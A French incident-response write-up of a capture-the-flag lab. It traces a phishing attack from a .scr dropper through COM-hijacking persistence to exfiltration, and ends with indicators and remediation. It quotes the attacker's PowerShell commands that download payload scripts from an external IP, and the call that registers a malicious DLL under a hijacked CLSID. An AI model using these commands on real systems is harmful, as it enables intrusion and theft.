---
layout: single
header:
  overlay_image: /assets/images/banner-014.jpg
  overlay_filter: 0.6
toc: true
toc_depth: 6
toc_label: Table of Contents
title: "Lab Sherlock : phishing bancaire, dropper .scr et persistance par COM Hijacking"
date: 2026-08-09
categories: [DFIR]
tags: [dfir, phishing, scr, com-hijacking, powershell, exfiltration, mitre-attck, t1546-015, secdojo, ctf]
---

# Lab Sherlock : attaque par phishing bancaire

> **Machine cible :** `10.8.0.100`
> **Résultat :** ✅ chaîne d'attaque reconstituée, du dropper `.scr` jusqu'à l'exfiltration, avec deux points restant non confirmés par le lab


## Résumé exécutif

Un acteur malveillant a ciblé un employé via un email de phishing contenant en pièce jointe un fichier `Banking.scr` — un screensaver Windows exécutable au format PE, compilé avec MinGW.

À l'ouverture du fichier, une fenêtre bleue est brièvement apparue puis a disparu, ce qui est caractéristique du comportement d'un dropper. L'attaquant a ensuite téléchargé plusieurs scripts PowerShell depuis son serveur, mis en place une persistance via **COM Hijacking**, puis procédé à l'exfiltration de données sensibles.

## Chronologie de l'attaque

| Heure | Événement |
| --- | --- |
| 15/07/2024 11:39:53 | Téléchargement et exécution de `Banking.scr` depuis le dossier Downloads |
| 15/07/2024 ~11:40 | `Banking.scr` exécute `_popen()` et lance PowerShell en arrière-plan |
| 15/07/2024 ~11:40 | Téléchargement de `search.ps1`, `inject.ps1` et `trans.ps1` depuis `164.92.235.130` |
| 15/07/2024 ~11:40 | Exécution de `inject.ps1` avec le CLSID `{B1AEBB5D-EAD9-4476-B375-9C3ED9F32AFC}` |
| 15/07/2024 ~11:40 | COM Hijacking : `svc_host.dll` enregistré comme handler COM dans le registre |
| 15/07/2024 ~11:40 | Exécution de `search.ps1` pour rechercher des fichiers sensibles |
| 15/07/2024 ~11:40 | Exécution de `trans.ps1` pour exfiltrer les données trouvées |
| 15/07/2024 ~12:03 | Installation de OpenVPN Connect comme accès distant alternatif |
| 15/07/2024 ~12:03 | Désactivation de NLA (Network Level Authentication) via `file.ps1` |
| 15/07/2024 ~12:03 | Suppression des scripts : `rm inject.ps1`, `rm trans.ps1`, `rm search.ps1` |

## Questions et réponses détaillées

### Q1 — Quel est le nom du fichier malveillant (dropper) ?

**Réponse :**

```text
Banking.scr
```

**Méthode de découverte :** navigation dans `C:\Users\Administrator\Downloads` via l'Explorateur Windows. Le fichier est affiché avec le type `Screen saver` — extension `.scr` — mais il s'agit d'un exécutable Windows déguisé en économiseur d'écran.

> 💡 Les fichiers `.scr` sont des exécutables PE valides que Windows traite nativement. Ils peuvent donc contourner certains filtres basiques qui bloquent les extensions `.exe`.

```powershell
Get-ChildItem -Path C:\Users -Recurse -File |
  Where-Object {
    $_.LastWriteTime -ge "2024-07-15 11:30:00" -and
    $_.LastWriteTime -le "2024-07-15 12:30:00"
  } |
  Select-Object FullName, LastWriteTime
```

```text
FullName                                             LastWriteTime
--------                                             -------------
C:\Users\Administrator\Downloads\Banking.scr        7/15/2024 11:39:53 AM
```

### Q2 — Quelle est l'IP:Port du serveur C2 du malware ?

**Réponse : non déterminée avec certitude.**

**Analyse :** `Banking.scr` est un exécutable compilé avec MinGW/MSYS2 — GCC `13.1.0.0`. L'analyse des imports révèle qu'il n'utilise pas directement de fonctions réseau telles que WinINet ou WinSock. Il utilise plutôt `_popen()` et `_pclose()` pour exécuter des commandes shell.

Cela signifie que `Banking.scr` délègue probablement la communication réseau à un processus enfant, comme PowerShell ou `cmd.exe`. L'adresse IP du serveur C2 n'est donc pas nécessairement codée directement dans le binaire.

> ⚠️ Aucun journal réseau détaillé n'était disponible sur la machine : Sysmon était absent, les journaux du pare-feu étaient désactivés et aucun cliché instantané n'était disponible pour capturer la connexion.

```powershell
$bytes = [System.IO.File]::ReadAllBytes(
  'C:\Users\Administrator\Downloads\Banking.scr'
)

$text = -join (
  $bytes |
    Where-Object { $_ -ge 32 -and $_ -le 126 } |
    ForEach-Object { [char]$_ }
)

$text |
  Select-String -Pattern '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' -AllMatches
```

```text
13.1.0.0
```

Cette valeur correspond à un artefact de version du compilateur MinGW et non à une IP C2 confirmée.

### Q3 — Quelle est l'IP du serveur utilisé pour télécharger les fichiers distants ?

**Réponse :**

```text
164.92.235.130
```

**Méthode de découverte :** lecture de l'historique des commandes PowerShell. Par défaut, PowerShell enregistre les commandes saisies dans le fichier `ConsoleHost_history.txt`, même sans configuration avancée de journalisation.

> 💡 Cet artefact est souvent oublié par les attaquants lors du nettoyage.

```powershell
Get-Content `
  "C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
```

Sortie pertinente :

```powershell
iwr http://164.92.235.130/Banking.scr -OutFile Banking.scr
iwr http://164.92.235.130/search.ps1 -OutFile search.ps1
iwr http://164.92.235.130/inject.ps1 -OutFile inject.ps1
iwr http://164.92.235.130/trans.ps1 -OutFile trans.ps1
```

### Q4 — Quels fichiers l'attaquant a-t-il déposés sur la machine ?

**Réponse :**

```text
search.ps1 / inject.ps1 / trans.ps1
```

**Analyse :** les trois fichiers ont été téléchargés depuis `164.92.235.130` via `Invoke-WebRequest`, abrégé en `iwr`, dans PowerShell.

Les scripts ont ensuite été supprimés par l'attaquant afin d'effacer ses traces, notamment avec des commandes de type :

```powershell
rm .\trans.ps1
rm .\inject.ps1
rm .\search.ps1
```

**Rôle présumé des scripts :**

| Script | Rôle présumé |
| --- | --- |
| `search.ps1` | Recherche de fichiers sensibles sur le système, notamment par extension |
| `inject.ps1` | Injection d'une DLL malveillante via COM Hijacking ; reçoit un CLSID en paramètre |
| `trans.ps1` | Transfert et exfiltration des données trouvées vers le serveur distant |

### Q5 — Quel est l'ID MITRE ATT&CK de la technique de persistance ?

**Réponse :**

```text
T1546.015 — Event Triggered Execution: COM Hijacking
```

**Méthode de découverte :** l'historique PowerShell montre l'exécution de `inject.ps1` avec le paramètre suivant :

```text
B1AEBB5D-EAD9-4476-B375-9C3ED9F32AFC
```

Il s'agit d'un GUID de CLSID. La vérification de ce CLSID dans le registre montre que le handler COM légitime a été remplacé par `svc_host.dll`.

```powershell
. .\inject.ps1 B1AEBB5D-EAD9-4476-B375-9C3ED9F32AFC
```

```powershell
Get-ItemProperty `
  "Registry::HKEY_CLASSES_ROOT\CLSID\{B1AEBB5D-EAD9-4476-B375-9C3ED9F32AFC}\InprocServer32"
```

```text
(default) : C:\Users\ADMINI~1\AppData\Local\Temp\2\st5pkrvd.ftp\svc_host.dll
ThreadingModel : Both
```

Recherche des tâches planifiées concernées :

```powershell
Get-ScheduledTask |
  ForEach-Object {
    $xml = [xml](Export-ScheduledTask `
      -TaskName $_.TaskName `
      -TaskPath $_.TaskPath
    )

    if ($xml.OuterXml -match 'B1AEBB5D-EAD9-4476-B375-9C3ED9F32AFC') {
      Write-Output "MATCH: $($_.TaskPath)$($_.TaskName)"
    }
  }
```

```text
MATCH: \Microsoft\Windows\SoftwareProtectionPlatform\SvcRestartTask
MATCH: \Microsoft\Windows\SoftwareProtectionPlatform\SvcRestartTaskLogon
MATCH: \Microsoft\Windows\SoftwareProtectionPlatform\SvcRestartTaskNetwork
```

**Explication :** le CLSID `{B1AEBB5D-EAD9-4476-B375-9C3ED9F32AFC}` correspond au composant `SppSvcRestartTaskHandler Class`, utilisé par les tâches planifiées de Software Protection Platform pour redémarrer le service de licence Windows.

En remplaçant le handler légitime par `svc_host.dll`, l'attaquant s'assure que sa DLL malveillante sera exécutée automatiquement lorsque ces tâches planifiées se déclenchent. Il s'agit d'une technique furtive qui ne crée pas de nouveau service visible.

### Q6 — Quel est le nom du service ciblé ?

**Réponse :**

```text
Software Protection
```

> ⚠️ Réponse indiquée comme non confirmée par le lab.

**Analyse :** le service Windows ciblé est `sppsvc`, également appelé **Software Protection**. Ses tâches planifiées — `SvcRestartTask`, `SvcRestartTaskLogon` et `SvcRestartTaskNetwork` — ont été détournées via COM Hijacking pour exécuter la DLL malveillante.

```powershell
Get-Service -Name sppsvc |
  Select-Object Name, DisplayName
```

```powershell
sc.exe qdescription sppsvc
```

```text
Name    DisplayName
----    -----------
sppsvc  Software Protection
```

Description observée :

```text
It is strongly recommended that you not disable the Software Protection service.
```

### Q7 — Quel est le chemin complet du fichier malveillant de persistance ?

**Réponse :**

```text
C:\Users\Administrator\AppData\Local\Temp\2\st5pkrvd.ftp\svc_host.dll
```

**Méthode :** lecture de la clé de registre `InprocServer32` associée au CLSID détourné.

`ADMINI~1` est le format court Windows 8.3 de `Administrator`. Le dossier `st5pkrvd.ftp` utilise une extension atypique afin de masquer son contenu. Le nom `svc_host.dll` ressemble volontairement à celui du processus légitime `svchost.exe`.

```powershell
Get-ItemProperty `
  "HKCU:\SOFTWARE\Classes\CLSID\{B1AEBB5D-EAD9-4476-B375-9C3ED9F32AFC}\InprocServer32"
```

```text
(default) : C:\Users\ADMINI~1\AppData\Local\Temp\2\st5pkrvd.ftp\svc_host.dll
```

### Q8 — Qu'a fait l'attaquant après la persistance ?

**Réponse :**

```text
C — The attacker proceeded with data exfiltration
```

**Analyse :** la séquence observée dans l'historique PowerShell montre clairement :

1. `search.ps1` recherche des fichiers sensibles par extension ;
2. `trans.ps1` transfère les fichiers trouvés vers le serveur distant ;
3. `rm .\trans.ps1` et `rm .\inject.ps1` suppriment les scripts afin de nettoyer les traces.

Le nom même des scripts — `search` pour chercher et `trans` pour transférer — confirme l'intention d'exfiltration.

> ℹ️ Aucune preuve de mouvement latéral, de dump SAM/hash ou de création de compte administrateur n'a été trouvée.

### Q9 — Quelles extensions l'attaquant cible-t-il pour l'exfiltration ?

**Réponse soumise :**

```text
B (log), C (txt), E (kdbx)
```

> ⚠️ Réponse indiquée comme non confirmée par le lab.

**Analyse et raisonnement :** le script `search.ps1` a été supprimé et n'a pas pu être récupéré : aucun cliché instantané ni Volume Shadow Copy n'était disponible.

Le raisonnement repose donc sur le contexte de l'attaque bancaire et sur les options proposées :

- **B. `log`** — journaux pouvant contenir des tokens, des sessions ou des identifiants en clair
- **C. `txt`** — fichiers fréquemment utilisés pour stocker des mots de passe, notes ou identifiants
- **E. `kdbx`** — bases de données KeePass contenant des mots de passe, particulièrement intéressantes pour un attaquant ciblant des données bancaires ou financières

**Options moins probables :**

- **A. `sql`** — possible, mais moins ciblé dans ce contexte
- **D. `svg`** — format d'image vectoriel, peu intéressant pour l'exfiltration de données
- **F. `ini` / G. `conf`** — fichiers de configuration système, généralement moins susceptibles de contenir directement des données financières

## Indicateurs de compromission — IOC

| Type | Valeur | Description |
| --- | --- | --- |
| Fichier | `Banking.scr` | Dropper initial distribué par phishing |
| Fichier | `svc_host.dll` | DLL malveillante utilisée pour la persistance COM |
| IP | `164.92.235.130` | Serveur de téléchargement des scripts |
| Chemin | `C:\Users\Administrator\AppData\Local\Temp\2\st5pkrvd.ftp\svc_host.dll` | DLL de persistance |
| CLSID | `{B1AEBB5D-EAD9-4476-B375-9C3ED9F32AFC}` | CLSID COM détourné |
| Registre | `HKCU\SOFTWARE\Classes\CLSID\{B1AEBB5D...}\InprocServer32` | Clé de persistance COM |
| Scripts | `search.ps1`, `inject.ps1`, `trans.ps1` | Scripts malveillants, supprimés après utilisation |
| Tâches | `\Microsoft\Windows\SoftwareProtectionPlatform\SvcRestartTask*` | Tâches planifiées détournées |

## Chaîne d'attaque — MITRE ATT&CK

| Phase | Technique | ID | Description |
| --- | --- | --- | --- |
| Initial Access | Phishing Attachment | `T1566.001` | Email contenant `Banking.scr` en pièce jointe |
| Execution | User Execution | `T1204.002` | Ouverture de `Banking.scr` par l'employé |
| Execution | Command and Scripting Interpreter: PowerShell | `T1059.001` | Exécution de scripts PowerShell |
| Persistence | COM Hijacking | `T1546.015` | `svc_host.dll` enregistré comme handler COM |
| Defense Evasion | File Deletion | `T1070.004` | Suppression des scripts avec `rm` |
| Defense Evasion | Masquerading | `T1036` | `svc_host.dll` ressemble à `svchost.exe` |
| Collection | File and Directory Discovery / File Search | `T1083` | `search.ps1` recherche les fichiers sensibles |
| Exfiltration | Exfiltration Over C2 Channel | `T1041` | `trans.ps1` transfère les données |

## Recommandations de remédiation

### Actions immédiates

1. Isoler immédiatement la machine du réseau.
2. Supprimer la clé de registre :
```text
   HKCU\SOFTWARE\Classes\CLSID\{B1AEBB5D-EAD9-4476-B375-9C3ED9F32AFC}
```
3. Supprimer le fichier `svc_host.dll` et son dossier parent.
4. Réactiver la NLA (Network Level Authentication) sur RDP.
5. Réinitialiser tous les mots de passe de la machine.
6. Bloquer `164.92.235.130` au niveau du pare-feu.

### Actions à long terme

1. Déployer Sysmon sur tous les postes afin d'améliorer la visibilité réseau et processus.
2. Activer les journaux du pare-feu Windows, notamment `LogAllowed` et `LogBlocked`.
3. Activer l'audit PowerShell : Script Block Logging et Module Logging.
4. Former les employés à identifier les pièces jointes suspectes, notamment `.scr`, `.js`, `.hta` et `.lnk`.
5. Mettre en place une solution EDR capable de détecter le COM Hijacking en temps réel.

## Leçons retenues

- Une extension `.scr` est un exécutable PE à part entière — elle contourne souvent les filtres qui ne bloquent que `.exe`, un point à intégrer dans toute formation de sensibilisation au phishing.
- L'absence de Sysmon et de journaux pare-feu a directement empêché de confirmer l'IP:Port exact du C2 (Q2) — un rappel que la visibilité réseau doit être en place *avant* l'incident, pas après.
- `ConsoleHost_history.txt` est un artefact PowerShell simple mais souvent oublié par les attaquants lors du nettoyage ; il peut suffire à reconstituer une chronologie complète même quand les scripts eux-mêmes ont été supprimés.
- Le COM Hijacking via une tâche planifiée système légitime (Software Protection Platform) est une technique de persistance furtive : elle ne crée aucun nouveau service visible et se fond dans l'activité normale de Windows.
- Documenter explicitement les réponses "non confirmées par le lab" (Q6, Q9) plutôt que de les présenter comme certaines est une bonne pratique à conserver dans un rapport DFIR.

## Références

- Technique MITRE ATT&CK **T1546.015** — Event Triggered Execution: COM Hijacking
- Technique MITRE ATT&CK **T1566.001** — Phishing: Spearphishing Attachment
- Technique MITRE ATT&CK **T1070.004** — Indicator Removal: File Deletion
- Technique MITRE ATT&CK **T1041** — Exfiltration Over C2 Channel

---

*Rapport généré dans le cadre du lab Sherlock — sec-dojo.com.*
